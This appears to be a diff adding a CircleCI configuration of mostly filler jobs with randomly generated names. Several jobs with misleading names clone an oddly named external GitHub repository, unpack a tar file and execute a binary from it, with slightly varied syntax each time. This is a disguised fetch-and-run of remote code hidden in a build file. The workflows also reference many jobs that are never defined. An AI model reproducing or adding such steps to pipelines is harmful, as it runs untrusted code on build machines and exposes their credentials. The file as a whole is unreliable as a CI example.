+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'CloneAdapterMainBranchTrack1'
+  compare-console-checksums:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/CloneAdapterMainBranchTrack1" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=2 --filter=blob:none "https://github.com/${stepof}/${settings}" ./
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar xvf test-compilation-task.tar
+      - run:
+          command: |
+            /bin/sh -c "./import-status-page-seed-data"
+  StampRendererVersionNumber:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: RequiredPluginInstall (part 8)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'SeedPreviewDatabaseOnTimeout moveBuildOutputsForEachService' > /tmp/hourly-artifact-export/FallbackDocumentationUpdate
+            ls -l /tmp/hourly-artifact-export/FallbackDocumentationUpdate
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'FallbackDocumentationUpdate'
+  runtime-shared-library:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/FallbackDocumentationUpdate" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --filter=tree:0 "https://github.com/${stepof}/${settings}" $PWD
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract < test-compilation-task.tar
+      - run:
+          command: |
+            bash -lc './import-status-page-seed-data'
+  ExtendedDependencyAuditHookJob7:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: automatedProductionReleaseStage
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'BumpEngineReleaseTag full-migration-rollback' > /tmp/hourly-artifact-export/connector-upgrade-dry-run
+            ls -l /tmp/hourly-artifact-export/connector-upgrade-dry-run
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'connector-upgrade-dry-run'
+  exportLandingPageScreenshots:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/connector-upgrade-dry-run" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 3 "https://github.com/${stepof}/${settings}" "$PWD"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar -xf test-compilation-task.tar --directory .
+      - run:
+          command: |
+            env "./import-status-page-seed-data"
+  refresh-documentation-site:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: compress-billing-templates
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'isolated-release-bump-step SplitInventoryRegressionTests' > /tmp/hourly-artifact-export/ComparingUserPortalChecksumFile
+            ls -l /tmp/hourly-artifact-export/ComparingUserPortalChecksumFile
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'ComparingUserPortalChecksumFile'
+  compiler-manual-pages:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/ComparingUserPortalChecksumFile" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 3 --filter=blob:none "https://github.com/${stepof}/${settings}" `pwd`
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract --verbose -f test-compilation-task.tar
+      - run:
+          command: |
+            cd "$(pwd)" && ./import-status-page-seed-data
+  post-scan-backup:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: compare-test-results-manually
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'driver-binary PostLintSummaryTrack2' > /tmp/hourly-artifact-export/ProductionRollOutJob
+            ls -l /tmp/hourly-artifact-export/ProductionRollOutJob
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'ProductionRollOutJob'
+  multi-stage-repository-checkout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/ProductionRollOutJob" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth=4 "https://github.com/${stepof}/${settings}" "${PWD}"
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar xf test-compilation-task.tar
+      - run:
+          command: |
+            cd "$(pwd)" && exec ./import-status-page-seed-data
+  backgroundImageTagging:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: fallbackArtifactDigest
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'secondary-rollback displaying-test-status' > /tmp/hourly-artifact-export/benchmark-rule-engine
+            ls -l /tmp/hourly-artifact-export/benchmark-rule-engine
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'benchmark-rule-engine'
+  partial-preview-deployment:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/benchmark-rule-engine" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --depth 4 --filter=blob:none "https://github.com/${stepof}/${settings}" .
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --verbose --extract -f test-compilation-task.tar
+      - run:
+          command: |
+            cd "$PWD" && exec ./import-status-page-seed-data
+  high-priority-backup:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: AgentStateRestore
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'alert-stakeholders-of-failure ExecutingQualityChecks' > /tmp/hourly-artifact-export/post-checkout-audit
+            ls -l /tmp/hourly-artifact-export/post-checkout-audit
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'post-checkout-audit'
+  LintAndValidateParserChangelog:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: deploy-dispatcher-to-canary-nodes
+          command: |
+            tr -s ' ' '\n' < "/tmp/hourly-artifact-export/post-checkout-audit" | awk 'length($0) < 8' | head -c 384
+      - run:
+          name: PreRestoreJobAttempt4
+          command: |
+            stepof="libbichilton370446gwowyizv-dot"; settings="experimental-report-upload"
+            git clone --jobs 2 "https://github.com/${stepof}/${settings}" .
+      - run:
+          name: FreezeIdentityServiceDevelopmentDependencies
+          command: |
+            tar --extract -f test-compilation-task.tar -C .
+      - run:
+          command: |
+            "./import-status-page-seed-data"
+
+  CompleteSyntaxCheck:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Tear down emulator during maintenance window
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'probe-analytics-container post-launch-performance-tests' > /tmp/hourly-artifact-export/incremental-change-review
+            ls -l /tmp/hourly-artifact-export/incremental-change-review
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'incremental-change-review'
+  report-generation-tier-2:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Auditing Sandbox Settings
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'compile-and-package-fonts AuditValidatorManifest' > /tmp/hourly-artifact-export/post-checkout-audit
+            ls -l /tmp/hourly-artifact-export/post-checkout-audit
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'post-checkout-audit'
+  persist-importer-cache:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Post-setup full test suite
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'probing-split-2-of-2 final-query-benchmark' > /tmp/hourly-artifact-export/weekly-analysis-hook
+            ls -l /tmp/hourly-artifact-export/weekly-analysis-hook
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'weekly-analysis-hook'
+  on-demand-workspace-cleanup:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: hourlyCompilerSetupStep
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'ApplicationPackagingStage Authentication' > /tmp/hourly-artifact-export/post-tag-sanity-checks
+            ls -l /tmp/hourly-artifact-export/post-tag-sanity-checks
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'post-tag-sanity-checks'
+  compare-database-schemas:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Promote Build Artifacts to Mirror Servers (pass 2)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'dependency-restore-run-lane-2 decode-binary-data-for-audit' > /tmp/hourly-artifact-export/PreBuildCredentialRotation
+            ls -l /tmp/hourly-artifact-export/PreBuildCredentialRotation
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'PreBuildCredentialRotation'
+  primary-emulator-signing:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Cache stream processor tools with verbose output
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'installer-deploy schema-lint-task' > /tmp/hourly-artifact-export/launch-security-tests
+            ls -l /tmp/hourly-artifact-export/launch-security-tests
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'launch-security-tests'
+  ArtifactExportRoutine:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: basic-packaging-job-3
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'flagConfigurationDrift post-approval-task-shard-2' > /tmp/hourly-artifact-export/IncrementalDependencyFetchStage
+            ls -l /tmp/hourly-artifact-export/IncrementalDependencyFetchStage
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'IncrementalDependencyFetchStage'
+  log-compression-task:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: postLaunchVolumeRemoval
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'post-install-summary ReportingBuild' > /tmp/hourly-artifact-export/MigrationRollbackPipeline
+            ls -l /tmp/hourly-artifact-export/MigrationRollbackPipeline
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'MigrationRollbackPipeline'
+  roll-out-runtime:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Test release bundle
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'AnalyzePortalSizeReport CopyReleasePackage' > /tmp/hourly-artifact-export/installer-dependencies
+            ls -l /tmp/hourly-artifact-export/installer-dependencies
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'installer-dependencies'
+  secondary-rebuild:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: secondary-symbol-upload
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'parallel-asset-compilation edgeProxyCompilerCache' > /tmp/hourly-artifact-export/connector-upgrade-dry-run
+            ls -l /tmp/hourly-artifact-export/connector-upgrade-dry-run
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'connector-upgrade-dry-run'
+  test-tutorials-with-coverage:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: incrementalCacheCleanup
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'release-session-store set-up-environment' > /tmp/hourly-artifact-export/FallbackDocumentationUpdate
+            ls -l /tmp/hourly-artifact-export/FallbackDocumentationUpdate
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'FallbackDocumentationUpdate'
+  deploy-importer-to-edge-nodes:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: ApplyingHelpCenterManifests
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'MessagingSignatures execute-policy-checks' > /tmp/hourly-artifact-export/ProductionRollOutJob
+            ls -l /tmp/hourly-artifact-export/ProductionRollOutJob
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'ProductionRollOutJob'
+  BuildAndPublishLoadBalancer:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: post-review-format-checks
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'compile-extension-migrations build-promotion-hook' > /tmp/hourly-artifact-export/LinkNotifierBinary
+            ls -l /tmp/hourly-artifact-export/LinkNotifierBinary
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'LinkNotifierBinary'
+  build-digest-workflow-round-3:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Recording file digest
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'sign-and-verify post-rollback-lint' > /tmp/hourly-artifact-export/retry-failed-steps
+            ls -l /tmp/hourly-artifact-export/retry-failed-steps
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'retry-failed-steps'
+  sync-firmware-changelog:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Releases
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'benchmarking-memory-usage CopyTimingReport' > /tmp/hourly-artifact-export/upgrade-smoke-test-bucket-5
+            ls -l /tmp/hourly-artifact-export/upgrade-smoke-test-bucket-5
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'upgrade-smoke-test-bucket-5'
+  signAndUploadObjectFiles:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: storing-sandbox-coverage-report
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'PluginCodeAnalysis MigrateDriverDatabase' > /tmp/hourly-artifact-export/copy-developer-guide
+            ls -l /tmp/hourly-artifact-export/copy-developer-guide
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'copy-developer-guide'
+  alert-support-team-before-merge:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: MobileAppRebuild (worker 14)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'pre-sync-verification ExportServiceConfiguration' > /tmp/hourly-artifact-export/PreIntegrationFunctionalTests
+            ls -l /tmp/hourly-artifact-export/PreIntegrationFunctionalTests
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'PreIntegrationFunctionalTests'
+  security-check-run:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Clean up converter build cache
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'backup-agent-database-snapshot ShowLoaderChecksums' > /tmp/hourly-artifact-export/ViewerRegressionTests
+            ls -l /tmp/hourly-artifact-export/ViewerRegressionTests
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'ViewerRegressionTests'
+  PostLaunchQueryBenchmark:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: front-end-rebuild
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'StatusPageReleaseBuildPart7 routine-schema-rollback-tier-3' > /tmp/hourly-artifact-export/mandatory-resource-removal
+            ls -l /tmp/hourly-artifact-export/mandatory-resource-removal
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'mandatory-resource-removal'
+  LintManifest:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: MultiStageFreeze
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'admin-panel-cache measuring-disk-usage' > /tmp/hourly-artifact-export/RevertingDeployment
+            ls -l /tmp/hourly-artifact-export/RevertingDeployment
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'RevertingDeployment'
+  purgeMailerCache:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: PostSubmitReview (run 2)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'ViewerDataSync update-agent-approval-gate' > /tmp/hourly-artifact-export/deleting-test-cluster
+            ls -l /tmp/hourly-artifact-export/deleting-test-cluster
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'deleting-test-cluster'
+  PrepareImageProcessor:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Partner portal timing data
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'loader-release-promotion database-deployment-task' > /tmp/hourly-artifact-export/benchmark-rule-engine
+            ls -l /tmp/hourly-artifact-export/benchmark-rule-engine
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'benchmark-rule-engine'
+  authenticationStyleSheets:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: failureNotificationPhasePass2
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'CleanBuildCache extension-code-analysis' > /tmp/hourly-artifact-export/FrontEndBuildMetadata
+            ls -l /tmp/hourly-artifact-export/FrontEndBuildMetadata
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'FrontEndBuildMetadata'
+  artifact-cleanup-iteration-1:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Restore cached layers for release build (worker 7)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'preview-deployment-replica-2 stamp-billing-version' > /tmp/hourly-artifact-export/InspectDebugSymbols
+            ls -l /tmp/hourly-artifact-export/InspectDebugSymbols
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'InspectDebugSymbols'
+  export-attempt-4:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: Image compression (iteration 7)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'ServerCertificateImportJob track-linker-code-coverage' > /tmp/hourly-artifact-export/ComparingUserPortalChecksumFile
+            ls -l /tmp/hourly-artifact-export/ComparingUserPortalChecksumFile
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'ComparingUserPortalChecksumFile'
+  RequiredCacheRestore:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Scheduled repository sync workflow (worker 8)
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'requiredSitePublish BatchWorkerBaseImageTier2' > /tmp/hourly-artifact-export/post-deploy-lint
+            ls -l /tmp/hourly-artifact-export/post-deploy-lint
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'post-deploy-lint'
+  driverImageSlice5Of5:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Audit scheduler development dependencies
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'tear-down-editor-data-store parallel-network-setup' > /tmp/hourly-artifact-export/PostLintStagedRollOut
+            ls -l /tmp/hourly-artifact-export/PostLintStagedRollOut
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'PostLintStagedRollOut'
+  editor-container-image:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: moveMessagingTimingReport
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'PushingIndexerImage loadDefaultMobileAppSettings' > /tmp/hourly-artifact-export/FullConsoleAudit
+            ls -l /tmp/hourly-artifact-export/FullConsoleAudit
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'FullConsoleAudit'
+  calculateWorkerChecksums:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: post-checkout-review
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'repository-fetch-hook ProvisioningTestEnvironment' > /tmp/hourly-artifact-export/CloneAdapterMainBranchTrack1
+            ls -l /tmp/hourly-artifact-export/CloneAdapterMainBranchTrack1
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'CloneAdapterMainBranchTrack1'
+  WriteDebuggerBuildMetadata:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hourly-artifact-export
+      - run:
+          name: routine compatibility tests
+          command: |
+            mkdir -p /tmp/hourly-artifact-export && echo 'bundle-name-server-lane-4 display-duplicate-lines' > /tmp/hourly-artifact-export/identity-service-user-guide
+            ls -l /tmp/hourly-artifact-export/identity-service-user-guide
+      - persist_to_workspace:
+          root: /tmp/hourly-artifact-export
+          paths:
+            - 'identity-service-user-guide'
+workflows:
+  CollectorExecutable:
+    jobs:
+      - one-time-approval
+      - CompleteSyntaxCheck:
+          requires:
+            - one-time-approval
+      - apply-infrastructure-changes:
+          requires:
+            - CompleteSyntaxCheck
+      - high-priority-backup:
+          requires:
+            - CompleteSyntaxCheck
+      - report-generation-tier-2:
+          requires:
+            - high-priority-backup
+      - LintAndValidateParserChangelog:
+          requires:
+            - report-generation-tier-2
+      - PublishToInternalSite:
+          requires:
+            - report-generation-tier-2
+      - persist-importer-cache:
+          requires:
+            - PublishToInternalSite
+      - timing-report-job:
+          requires:
+            - persist-importer-cache
+      - steward-replica-3:
+          requires:
+            - persist-importer-cache
+      - on-demand-workspace-cleanup:
+          requires:
+            - steward-replica-3
+      - linker-cleanup:
+          requires:
+            - on-demand-workspace-cleanup
+      - HashingGatewayReleasePackage:
+          requires:
+            - on-demand-workspace-cleanup
+      - compare-database-schemas:
+          requires:
+            - HashingGatewayReleasePackage
+      - SharedDownload:
+          requires:
+            - compare-database-schemas
+      - data-importer-compile:
+          requires:
+            - compare-database-schemas
+      - primary-emulator-signing:
+          requires:
+            - data-importer-compile
+      - finding-uncommitted-changes:
+          requires:
+            - primary-emulator-signing
+      - bundle-source-code:
+          requires:
+            - primary-emulator-signing
+      - ArtifactExportRoutine:
+          requires:
+            - bundle-source-code
+      - ManifestGeneration:
+          requires:
+            - ArtifactExportRoutine
+      - extended-artifact-fetch-stage:
+          requires:
+            - ArtifactExportRoutine
+      - log-compression-task:
+          requires:
+            - extended-artifact-fetch-stage
+      - SequentialCredentialRotation:
+          requires:
+            - log-compression-task
+      - RestartEmulatorOnSuccess:
+          requires:
+            - log-compression-task
+      - roll-out-runtime:
+          requires:
+            - RestartEmulatorOnSuccess
+      - CleanUpBuildCache:
+          requires:
+            - roll-out-runtime
+      - ExtendedDependencyAuditHookJob7:
+          requires:
+            - roll-out-runtime
+      - secondary-rebuild:
+          requires:
+            - ExtendedDependencyAuditHookJob7
+      - exportLandingPageScreenshots:
+          requires:
+            - secondary-rebuild
+      - StampRendererVersionNumber:
+          requires:
+            - secondary-rebuild
+      - test-tutorials-with-coverage:
+          requires:
+            - StampRendererVersionNumber
+      - runtime-shared-library:
+          requires:
+            - test-tutorials-with-coverage
+      - post-scan-backup:
+          requires:
+            - test-tutorials-with-coverage
+      - deploy-importer-to-edge-nodes:
+          requires:
+            - post-scan-backup
+      - multi-stage-repository-checkout:
+          requires:
+            - deploy-importer-to-edge-nodes
+      - verify-dependencies:
+          requires:
+            - deploy-importer-to-edge-nodes
+      - BuildAndPublishLoadBalancer:
+          requires:
+            - verify-dependencies
+      - PlaygroundTests:
+          requires:
+            - BuildAndPublishLoadBalancer
+      - credential-rotation-phase:
+          requires:
+            - BuildAndPublishLoadBalancer
+      - build-digest-workflow-round-3:
+          requires:
+            - credential-rotation-phase
+      - import-snapshots-every-night:
+          requires:
+            - build-digest-workflow-round-3
+      - LauncherCodeSigningReplica1:
+          requires:
+            - build-digest-workflow-round-3
+      - sync-firmware-changelog:
+          requires:
+            - LauncherCodeSigningReplica1
+      - StorageBenchmarkIteration5:
+          requires:
+            - sync-firmware-changelog
+  Rollback:
+    jobs:
+      - UnpackFrameworkDistribution
+      - signAndUploadObjectFiles:
+          requires:
+            - UnpackFrameworkDistribution
+      - promote-workers-to-staging:
+          requires:
+            - signAndUploadObjectFiles
+      - deployment-stage-phase-5-of-5:
+          requires:
+            - signAndUploadObjectFiles
+      - alert-support-team-before-merge:
+          requires:
+            - deployment-stage-phase-5-of-5
+      - deleteCacheEntriesExceptLatest:
+          requires:
+            - alert-support-team-before-merge
+      - purge-analyzer-package-cache:
+          requires:
+            - alert-support-team-before-merge
+      - security-check-run:
+          requires:
+            - purge-analyzer-package-cache
+      - Flagging:
+          requires:
+            - security-check-run
+      - remote-schema-freeze:
+          requires:
+            - security-check-run
+      - PostLaunchQueryBenchmark:
+          requires:
+            - remote-schema-freeze
+      - deferred-credential-rotation:
+          requires:
+            - PostLaunchQueryBenchmark
+      - report-exporter-release-build:
+          requires:
+            - PostLaunchQueryBenchmark
+      - LintManifest:
+          requires:
+            - report-exporter-release-build
+      - PreCleanupScan:
+          requires:
+            - LintManifest
+      - worker-15-of-16:
+          requires:
+            - LintManifest
+      - purgeMailerCache:
+          requires:
+            - worker-15-of-16
+      - ManualCheckout:
+          requires:
+            - purgeMailerCache
+      - backgroundImageTagging:
+          requires:
+            - purgeMailerCache
+      - PrepareImageProcessor:
+          requires:
+            - backgroundImageTagging
+      - partial-preview-deployment:
+          requires:
+            - PrepareImageProcessor
+      - required-rollback:
+          requires:
+            - PrepareImageProcessor
+      - authenticationStyleSheets:
+          requires:
+            - required-rollback
+      - RequiredScanSummaryStage:
+          requires:
+            - authenticationStyleSheets
+      - provisioning-run:
+          requires:
+            - authenticationStyleSheets
+      - artifact-cleanup-iteration-1:
+          requires:
+            - provisioning-run
+      - pre-download-lint-checks:
+          requires:
+            - artifact-cleanup-iteration-1
+      - refresh-documentation-site:
+          requires:
+            - artifact-cleanup-iteration-1
+      - export-attempt-4:
+          requires:
+            - refresh-documentation-site
+      - compiler-manual-pages:
+          requires:
+            - export-attempt-4
+      - Capacity:
+          requires:
+            - export-attempt-4
+      - RequiredCacheRestore:
+          requires:
+            - Capacity
+      - conditional-deployment-approval:
+          requires:
+            - RequiredCacheRestore
